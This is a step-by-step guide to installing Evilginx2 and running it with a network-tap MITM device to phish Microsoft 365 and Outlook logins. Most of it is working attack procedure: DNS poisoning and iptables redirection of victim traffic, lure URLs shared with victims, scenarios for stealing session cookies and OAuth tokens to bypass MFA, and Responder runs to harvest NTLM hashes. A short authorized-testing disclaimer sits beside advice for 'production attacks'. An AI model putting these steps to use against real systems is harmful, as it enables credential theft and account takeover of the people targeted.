# Evilginx2 Installation & Setup

Complete guide for installing and configuring Evilginx2 with NAC-Tap MITM Edition.

## Prerequisites

- Go 1.19 or higher
- Root access
- Working DNS control or ability to perform DNS poisoning

## Installation

### 1. Install Go (if not already installed)

```bash
# Download and install Go
cd /tmp
wget https://go.dev/dl/go1.21.0.linux-arm64.tar.gz
sudo tar -C /usr/local -xzf go1.21.0.linux-arm64.tar.gz

# Add to PATH (add to ~/.bashrc for persistence)
export PATH=$PATH:/usr/local/go/bin
export GOPATH=$HOME/go
export PATH=$PATH:$GOPATH/bin
```

### 2. Clone and Build Evilginx2

```bash
# Create directory
sudo mkdir -p /opt/evilginx2
cd /opt/evilginx2

# Clone repository
sudo git clone https://github.com/kgretzky/evilginx2.git .

# Build from source
sudo go build -o evilginx main.go

# Verify installation
sudo /opt/evilginx2/evilginx -h
```

### 3. Configure Permissions

```bash
# Allow binary to bind to privileged ports
sudo setcap CAP_NET_BIND_SERVICE=+eip /opt/evilginx2/evilginx

# Create phishlets directory (if not exists)
sudo mkdir -p /opt/evilginx2/phishlets
```

### 4. Verify Phishlets

Check that Microsoft phishlets are available:

```bash
# List available phishlets
ls /opt/evilginx2/phishlets/

# Should see:
# - o365.yaml
# - outlook.yaml
# - microsoft.yaml
```

If Microsoft phishlets are missing, download them manually:

```bash
cd /opt/evilginx2/phishlets
sudo wget https://raw.githubusercontent.com/kgretzky/evilginx2/master/phishlets/o365.yaml
sudo wget https://raw.githubusercontent.com/kgretzky/evilginx2/master/phishlets/outlook.yaml
```

## Configuration for NAC-Tap

### 1. DNS Setup

For Evilginx to work, victims must resolve your fake domain to the bridge IP (10.200.66.1).

**Option A: Local DNS Poisoning (Recommended)**

Use `dnsspoof` or `bettercap` on the NAC device:

```bash
# Install dnsmasq for local DNS
sudo apt install dnsmasq

# Configure /etc/dnsmasq.conf
echo "address=/login.microsoft-sso.com/10.200.66.1" | sudo tee -a /etc/dnsmasq.conf
sudo systemctl restart dnsmasq
```

Then use MITM intercept for DNS (port 53 UDP) to redirect victim queries.

**Option B: External DNS Control**

If you control a domain, add an A record:

```
login.your-domain.com  →  10.200.66.1
```

### 2. SSL Certificates

Evilginx uses Let's Encrypt automatically for HTTPS, but on a local network, you'll need to:

1. **Use HTTP-only mode** (less effective, no SSL)
2. **Install a self-signed CA** on the victim device
3. **Use a legitimate domain** with Let's Encrypt

For testing, victims may need to accept certificate warnings.

## Usage with NAC-Tap

### 1. Start NAC-Tap

```bash
sudo python3 /opt/nac-tap/nac-tap.py
```

### 2. Access Web Interface

```
http://10.200.66.1:8080
```

### 3. Enable MITM Mode

1. Go to **MITM** tab
2. Click **Enable MITM**
3. Wait for victim identification (30s)

### 4. Intercept HTTPS Traffic

To allow Evilginx to receive HTTPS requests:

```bash
# Redirect port 443 to bridge IP
sudo iptables -t nat -A PREROUTING -i br0 -p tcp --dport 443 -j DNAT --to 10.200.66.1:443
sudo iptables -t nat -A PREROUTING -i br0 -p tcp --dport 80 -j DNAT --to 10.200.66.1:80
```

Or use the web interface **Evilginx** category intercept.

### 5. Start Evilginx via Web Interface

1. Go to **Evilginx** tab
2. (Optional) Enter custom domain or leave blank for `o365.local`
3. Click **Start O365** or **Start Outlook**
4. Share the **Lure URL** with victims

### 6. Monitor Captured Sessions

- Sessions appear automatically in the **Evilginx** tab
- Sessions include:
  - Username
  - Cookies
  - OAuth tokens
  - Session timestamp

## Session Extraction

Captured cookies and tokens are saved to:

```
/var/log/nac-captures/evilginx_sessions.json
```

### Manual Session Extraction

```bash
# View Evilginx database directly
sqlite3 /var/log/nac-captures/evilginx.db

# Query sessions
SELECT * FROM sessions WHERE captured = 1;
```

### Export from Web Interface

1. Go to **Evilginx** tab
2. Click **Export Sessions (JSON)**
3. Download complete session data including cookies and tokens

## Attack Scenarios

### Scenario 1: Office 365 Corporate Login

1. Victim connects through NAC tap
2. Enable MITM mode
3. Start Evilginx with O365 phishlet
4. Victim navigates to "login.microsoft-sso.com" (your fake domain)
5. Evilginx proxies to real Microsoft login
6. Victim enters credentials + MFA
7. Evilginx captures **session cookies** and **OAuth tokens**
8. Attacker imports cookies → Full account access bypassing MFA

### Scenario 2: Personal Outlook.com

Same as above but use **Outlook** phishlet for personal Microsoft accounts.

### Scenario 3: Combined with SMB/LLMNR

1. Enable MITM
2. Intercept **SMB** and **Name Resolution**
3. Start Evilginx for credential harvesting
4. Capture both **NTLM hashes** (PCredz) and **OAuth tokens** (Evilginx)

## Troubleshooting

### Evilginx Won't Start

```bash
# Check if Evilginx binary exists
ls -lh /opt/evilginx2/evilginx

# Check permissions
getcap /opt/evilginx2/evilginx

# Test manual start
sudo /opt/evilginx2/evilginx -p /opt/evilginx2/phishlets -d /tmp/test.db
```

### No Sessions Captured

- Verify DNS is pointing to 10.200.66.1
- Check iptables rules for port 80/443 redirect
- Ensure victim is accessing the lure URL (not real Microsoft)
- Check `/var/log/nac-captures/evilginx.log` for errors

### Certificate Warnings

Victims will see SSL warnings if:
- Using self-signed certificates
- Domain doesn't match
- Let's Encrypt failed

This is expected on local networks. For production attacks, use a legitimate domain.

## Security & Legal Warning

⚠️ **WARNING**: Evilginx2 captures authentication credentials and bypasses MFA.

- This tool is for **authorized penetration testing only**
- Unauthorized use is **illegal** in most jurisdictions
- Always get **written permission** before testing
- Use only in controlled lab environments

## Advanced Configuration

### Custom Phishlets

Create custom phishlets in `/opt/evilginx2/phishlets/`:

```yaml
# example: custom-app.yaml
name: 'custom-app'
author: 'Your Name'
min_ver: '3.0.0'

proxy_hosts:
  - {phish_sub: 'login', orig_sub: 'login', domain: 'example.com', is_landing: true}

sub_filters:
  - {hostname: 'example.com', sub: '', domain: 'example.com'}

auth_tokens:
  - domain: '.example.com'
    keys: ['session_token']

credentials:
  username:
    key: 'username'
  password:
    key: 'password'
```

### Persistent Configuration

To make Evilginx settings persistent, modify:

```bash
/var/log/nac-captures/evilginx-config/config.yaml
```

### Integration with Responder

For maximum credential capture, run Responder alongside Evilginx:

```bash
sudo responder -I br0 -wFv
```

This captures:
- **NTLM hashes** → Responder
- **Plaintext passwords** → PCredz
- **OAuth tokens** → Evilginx

## Database Schema

Evilginx uses SQLite. Key tables:

```sql
-- Sessions table
CREATE TABLE sessions (
    id INTEGER PRIMARY KEY,
    phishlet TEXT,
    username TEXT,
    password TEXT,
    tokens TEXT,
    cookies TEXT,
    create_time INTEGER,
    update_time INTEGER,
    captured INTEGER
);

-- Lures table
CREATE TABLE lures (
    id INTEGER PRIMARY KEY,
    phishlet TEXT,
    path TEXT,
    redirect_url TEXT,
    og_title TEXT,
    og_desc TEXT,
    og_image TEXT
);
```

## File Locations

| File | Purpose |
|------|---------|
| `/opt/evilginx2/evilginx` | Main binary |
| `/opt/evilginx2/phishlets/` | Phishlet templates |
| `/var/log/nac-captures/evilginx.db` | Session database |
| `/var/log/nac-captures/evilginx_sessions.json` | Exported sessions |
| `/var/log/nac-captures/evilginx.log` | Evilginx logs |
| `/var/log/nac-captures/evilginx-config/` | Configuration |

## References

- Evilginx2 GitHub: https://github.com/kgretzky/evilginx2
- Official Docs: https://help.evilginx.com
- Phishlet Development: https://help.evilginx.com/docs/phishlet-format

---

**Last Updated**: November 2025

